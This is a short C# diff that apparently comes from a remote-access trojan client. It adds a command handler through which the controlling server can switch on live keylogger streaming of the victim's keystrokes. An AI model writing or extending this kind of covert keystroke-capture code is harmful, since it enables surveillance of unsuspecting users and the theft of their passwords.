@@ -217,5 +217,11 @@ namespace xClient.Core.Commands
                 }
             }).Start();
         }
+
+        public static void HandleGetKeyloggerLiveResponse(Packets.ServerPackets.GetKeyloggerLive command, Client client)
+        {
+            if (Keylogger.Instance != null)
+                Keylogger.Instance.EnableLiveLogging(command.Enable, client);
+        }
     }
 }
